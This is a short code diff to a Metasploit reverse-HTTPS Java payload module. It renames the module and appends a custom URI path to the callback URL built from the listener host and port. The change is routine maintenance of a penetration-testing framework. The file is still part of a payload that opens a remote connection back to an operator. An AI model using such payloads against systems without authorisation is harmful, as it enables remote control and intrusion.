@@ -7,7 +7,7 @@ require 'msf/core'
 require 'msf/core/handler/reverse_https'
 require 'msf/core/payload/uuid/options'
 
-module Metasploit3
+module MetasploitModule
 
   CachedSize = 5932
 
@@ -57,6 +57,7 @@ module Metasploit3
     c << "Spawn=#{spawn}\n"
     c << "URL=https://#{datastore["LHOST"]}"
     c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
+    c << "#{luri}"
     c << generate_uri_uuid_mode(:init_java, uri_req_len)
     c << "\n"
 
